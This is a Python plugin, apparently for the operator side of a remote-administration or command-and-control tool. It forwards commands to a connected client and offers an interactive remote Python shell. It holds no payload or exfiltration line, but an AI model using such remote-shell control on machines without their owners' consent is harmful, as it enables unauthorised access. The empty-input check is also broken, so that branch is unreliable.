import shlex
from common import safe_input


class Plugin(object):
    version = 'v1.0'
    invocation = 'client '
    enabled = True

    def run(self, server, data):
        args = shlex.split(data)

        if not args:
            pass

        if args[0] == '-i':
            # Tell the client we want an interactive python shell.
            server.connection_mgr.send_command('client -i', get_cwd=False)
            while True:
                # Ask for a command to send to the client.
                command = safe_input('>>> ')
                # Handle the exit() command if needed.
                if command == 'exit()':
                    server.connection_mgr.send_command(command, get_cwd=False)
                    break
                # Send the command to the client and print the response..
                response = server.connection_mgr.send_command(command, get_cwd=False)
                if response.strip():
                    print(response.strip())
            return

        # Send the command to the client if it doesn't need to be intercepted!
        print(server.connection_mgr.send_command('client {}'.format(data)), end='')

